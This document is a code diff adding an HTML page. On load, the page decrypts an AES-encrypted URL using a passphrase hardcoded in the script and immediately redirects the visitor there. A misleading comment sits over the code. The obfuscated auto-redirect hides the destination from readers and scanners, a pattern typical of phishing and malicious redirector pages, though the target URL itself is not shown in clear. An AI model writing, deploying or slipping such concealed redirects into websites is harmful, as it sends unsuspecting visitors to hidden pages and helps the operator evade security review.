@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js"
+    integrity="sha256-/H4YS+7aYb9kJ5OKhFYPUjSJdrtV6AeyJOtTkw6X72o=" crossorigin="anonymous"></script>
+  <script>
+
+    // Title Header
+    const decryptedRedirectUrl = decrypt("U2FsdGVkX1/tl50Y/1cEnAtsKWGr2ZdJWfK5EvhzwcdAqRBen9IiL6pq/vfPwE7XIsDCTaZqB37O3wA38ZF3BonYvQrVP9e0JnOAmdX7agA/fmxOla6lr7THZw2gPsnyU+7Foy4zqRdXMSuv4aF+Cw==");
+
+    function decrypt(encryptedString) {
+      const decryptedBytes = CryptoJS.AES.decrypt(encryptedString, "My Secret Passphrase");
+      const plaintext = decryptedBytes.toString(CryptoJS.enc.Utf8);
+      return plaintext;
+    }
+  </script>
+  <script type="text/javascript">
+    window.location.href = decryptedRedirectUrl
+  </script>
+</head>
+
+<body></body>
+
+</html>
